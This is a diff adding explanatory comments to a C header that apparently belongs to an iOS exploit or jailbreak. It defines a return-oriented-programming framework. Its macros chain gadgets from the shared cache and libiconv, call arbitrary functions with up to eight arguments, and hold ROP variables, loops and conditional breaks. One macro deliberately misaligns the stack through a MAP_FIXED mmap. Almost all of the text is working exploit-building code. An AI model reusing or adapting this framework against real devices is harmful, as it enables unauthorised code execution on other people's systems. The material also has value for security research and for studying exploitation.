@@ -3,26 +3,32 @@
 #include <string.h>
 #include <sys/mman.h>
 
+// this is the file where everything related to roping lives
+// the main idea behind it is to create a linked list of rop_gadget structs that can then be turned into a file
+
 #ifndef ROP_H
 #define ROP_H
+// there are different types so that we know that we might need to add the base address of the rop chain or the base address of the cache etc
 enum ropgadget_types {
-	STATIC,
-	CODEADDR,
-	OFFSET,
-	REL_OFFSET,
-	NONE,
-	BUF,
-	BARRIER,
-	ROP_VAR,
-	ROP_LOOP_START,
-	ROP_LOOP_END,
-	ROP_LOOP_BREAK
+	STATIC, // static value
+	CODEADDR, // code address inside of the cache
+	OFFSET, // offset inside of the rop chain
+	REL_OFFSET, // realtiv offset inside of the rop chain
+	NONE, // default type
+	BUF, // this type is basically mainy static objects after each other
+	BARRIER, // this is used to split stage 2 into two rop stacks for each of the threads
+	ROP_VAR, // variable used in rop
+	ROP_LOOP_START, // start of a loop in rop
+	ROP_LOOP_END, // end of a loop in rop
+	ROP_LOOP_BREAK // break inside of the loop (this will break if x0 is none zero iirc)
 };
 
+// structure for comments that show up for debugging the rop stack in the debug version
 struct rop_gadget_comment {
 	uint64_t line;
 	char * comment;
 };
+// struct to hold each rop gadget
 struct rop_gadget {
 	uint64_t value;
 	int second_val;
@@ -32,6 +38,7 @@ struct rop_gadget {
 };
 typedef struct rop_gadget rop_gadget_t;
 
+// specific struct for rop values
 struct rop_var {
 	char * name;
 	uint64_t size;
@@ -41,8 +48,10 @@ struct rop_var {
 };
 typedef struct rop_var rop_var_t;
 
+// This is the first part of rop basically only used in stage 1 
 
 // TODO: explain what all of that does in greater detail
+// this sets up the rop framework by mallocing a head and defining a few vars
 #define ROP_SETUP(rop_chain_head) \
 	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
 	rop_gadget_t * prev = NULL; \
@@ -53,6 +62,7 @@ typedef struct rop_var rop_var_t;
 	(rop_chain_head) = curr_gadget; \
 	int ropchain_len = 0; 
 
+// this can be used to add an a new gadget to the list we can then modifiy 
 #define ADD_GADGET() \
 	ropchain_len++; \
 	if (prev != NULL) { \
@@ -65,6 +75,8 @@ typedef struct rop_var rop_var_t;
 	}else{ \
 		prev = curr_gadget; \
 	}
+
+// this will add a comment to the current rop gadget with the line number on none release builds so that we can easily identify where it is in the source file
 #ifndef RELEASE 
 #define ADD_COMMENT(mycomment) \
 	curr_gadget->comment = malloc(sizeof(struct rop_gadget_comment)); \
@@ -74,46 +86,59 @@ typedef struct rop_var rop_var_t;
 #define ADD_COMMENT(x)
 #endif
 
+// all of the ones below will then use ADD_GADGET now to first add a new gadget to the chain and then modifing it's values
+
+// so this one will insert a barrier and with that pad the rop stack to the specified address
 #define ADD_BARRIER(addr) \
 	ADD_GADGET(); \
 	curr_gadget->type = BARRIER; \
 	curr_gadget->value = addr;
 
+// add a loop start for a loop of a specific name
+// there was a plan to have inner loops so the name is needed for the break instruction, but I think I never added that functionallity (TODO: should check that :P)
 #define ADD_LOOP_START(name) \
 	ADD_GADGET(); \
 	curr_gadget->value = (uint64_t) strdup(name); \
 	curr_gadget->type = ROP_LOOP_START;
 
+// marking the end of a loop
 #define ADD_LOOP_END() \
 	ADD_GADGET(); \
 	curr_gadget->type = ROP_LOOP_END;
 
+// this will break out of the loop if x0 was none zero
+// the plan here was to chain these with other gadgets that perform aritmethic on the value in x0 to also get equal to and other stuff but I never did that
 #define ADD_LOOP_BREAK_IF_X0_NONZERO(name) \
 	ADD_GADGET(); \
 	curr_gadget->value = (uint64_t) strdup(name); \
 	curr_gadget->type = ROP_LOOP_BREAK;
 
+// adding a gadget that has a codeaddress inside of cache
 #define ADD_CODE_GADGET(addr) \
 	ADD_GADGET(); \
 	curr_gadget->value = (uint64_t)addr; \
 	curr_gadget->type = CODEADDR;
 
+// adding sth with a static value
 #define ADD_STATIC_GADGET(val) \
 	ADD_GADGET(); \
 	curr_gadget->value = (uint64_t) val; \
 	curr_gadget->type = STATIC;
 
+// adding sth with an offset in the chain
 #define ADD_OFFSET_GADGET(val) \
 	ADD_GADGET(); \
 	curr_gadget->value = val; \
 	curr_gadget->type = OFFSET;
 
+// adding a buffer
 #define ADD_BUFFER(address,size) \
 	ADD_GADGET(); \
 	curr_gadget->value = (uint64_t)address; \
 	curr_gadget->second_val = size; \
 	curr_gadget->type = BUF; 
 
+// adding a rop variable but we use an offset in it
 #define ADD_ROP_VAR_GADGET_W_OFFSET(name,offset) \
 	ADD_GADGET(); \
 	curr_gadget->value = (uint64_t) strdup(name); \
@@ -122,12 +147,14 @@ typedef struct rop_var rop_var_t;
 
 #define ADD_ROP_VAR_GADGET(name) ADD_ROP_VAR_GADGET_W_OFFSET(name,0)
 
+// relativ offset from this gadget
 #define ADD_REL_OFFSET_GADGET(val) \
 	ADD_GADGET(); \
 	curr_gadget->value = (uint64_t)val; \
 	curr_gadget->type = REL_OFFSET; 
 
 /****** FRAMEWORK ****/
+// this is the framework I use in stage 2
 
 /*
  This is our main gadget now:
@@ -256,6 +283,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET(next_addr); /* x30 */ 
 
+// as you can see the difference here is that we don't slide the address so we can also call static functions
 #define CALL_FUNCTION_NO_SLIDE(next_addr,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
 	if (rop_var_arg_num != 0 && rop_var_arg_num != -1) {LOG("WRONG AMOUNT OF ARGS (line:%d)",__LINE__);exit(1);} \
 	rop_var_arg_num = -1; \
@@ -276,12 +304,14 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET(next_addr); /* x30 */
 
+// we will chain the BEAST_GADGET after itself all the time so I also defined this macro
 #define CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
 	CALL_FUNCTION((offsets)->BEAST_GADGET,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
 
 // there is this gadget: str x0, [x19, #0x28]; ldp x29, x30, [sp, #0x10]; ldp x20, x19, [sp], #0x20; ret; 
 // we will use this to str x0 somewhere (cause we get x19 control from the gadget above)
 // Because we use a second call gadget we will jump back to the gadget abve to load the registers again/for the next func call
+// TODO: in theory I think it's also possible to not have it jump back to the loader gadget but jump straight to the gadget above, this would save a bit of space on the rop chain
 #define CALL_FUNC_WITH_RET_SAVE(where,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
 	CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8); \
 	ADD_GADGET(); \
@@ -305,6 +335,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); // x30 
 
+// this defines a rop variable with a specific size getting initalized with the contents passed via buf (keep in mind that this will only build the chain at the end and because it won't copy the buffer before that you need to keep it's contents constant after the definition/or the last version will be used)
 #define DEFINE_ROP_VAR(varname,varsize,buf) \
 	if (curr_rop_var != NULL) { \
 		new_rop_var = malloc(sizeof(rop_var_t)); \
@@ -317,6 +348,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	new_rop_var->next = NULL; \
 	curr_rop_var = new_rop_var; 
 
+// we will (ab)use memcpy to copy data from the stack into the rop var buffer
 #define SET_ROP_VAR_RAW(name,value,offset,size) \
 	ADD_COMMENT("set rop var"); \
 	ADD_GADGET(); \
@@ -336,11 +368,13 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
 
+// set 64 and 32 bit vars inside of rop var buffers at specific offsets
 #define SET_ROP_VAR64_W_OFFSET(name,value,offset) SET_ROP_VAR_RAW(name,value,offset,8)
 #define SET_ROP_VAR64(name,value) SET_ROP_VAR64_W_OFFSET(name,value,0)
 #define SET_ROP_VAR32_W_OFFSET(name,value,offset) SET_ROP_VAR_RAW(name,value,offset,4)
 #define SET_ROP_VAR32(name,value) SET_ROP_VAR32_W_OFFSET(name,value,0)
 
+// this can be used to make one rop var point to the other (basically *((uint64_t*)&name+offset1) = &other_name + offset2
 #define SET_ROP_VAR64_TO_VAR_W_OFFSET(name,offset1,other_name,offset2) \
 	ADD_COMMENT("set rop var 64 to var with offset"); \
 	ADD_GADGET(); \
@@ -360,6 +394,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
 
+// this can be used to copy from one rop var to another passing the dest as the first arg with it's offset and then in the second the src and it's offset
 #define ROP_VAR_CPY_W_OFFSET(name,offset1,other_name,offset2,size) \
 	ADD_COMMENT("copy rop var with offset"); \
 	ADD_GADGET(); \
@@ -379,8 +414,10 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
 
+// just used to copy one rop var into the other
 #define ROP_VAR_CPY(name,other_name,size) ROP_VAR_CPY_W_OFFSET(name,0,other_name,0,size)
 
+// optimization to save the return value right into a rop variable
 #define CALL_FUNC_RET_SAVE_VAR(name,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
 	CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8); \
 	ADD_GADGET(); \
@@ -405,6 +442,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); // x30 
 
 // TODO: make this faster
+// the problem with this being so slow is that it's used in loops and both rop var arg calls will call out to memcpy (see ROP_VAR_ARG_W_OFFSET below for a more detailed explanation on how the MACRO works)
 #define ROP_VAR_ADD(result,var1,var2) \
 	ADD_COMMENT("add two rop vars"); \
 	ROP_VAR_ARG_HOW_MANY(2); \
@@ -498,6 +536,7 @@ add_x0_gadget (from libiconv.2.dylib):
 
 #define ROP_VAR_ARG64(name,nr) ROP_VAR_ARG64_W_OFFSET(name,nr,0);
 
+// this can be used to load the content of a rop variable (first 8 bytes) into the register x0
 #define SET_X0_FROM_ROP_VAR(name) \
 	ADD_COMMENT("set x0 from rop var"); \
 	ADD_GADGET(); \
@@ -535,6 +574,7 @@ add_x0_gadget (from libiconv.2.dylib):
 
 
 // we will (mis)use the str_x0_gadget as a regloader to load regs with other values/offset the stack by another value
+// this is the setup that's used to misalign the stack, basically the mmap call is here to map the page that will be accessed by the function epilog to do the tailcall and then we copy the str_x0_gadget function pointer over the original one so that it will be called when x0 was 0 causing a stack misalignment (see stage2.m for an implementation on loops)
 #define SETUP_IF_X0() \
 	ADD_COMMENT("SETUP for cbz x0"); \
 	CALL_FUNC((offsets)->mmap,(((offsets)->cbz_x0_x16_load+(offsets)->new_cache_addr-0x180000000) & ~0x3fff),0x4000,PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANON,0,0,0,0); \
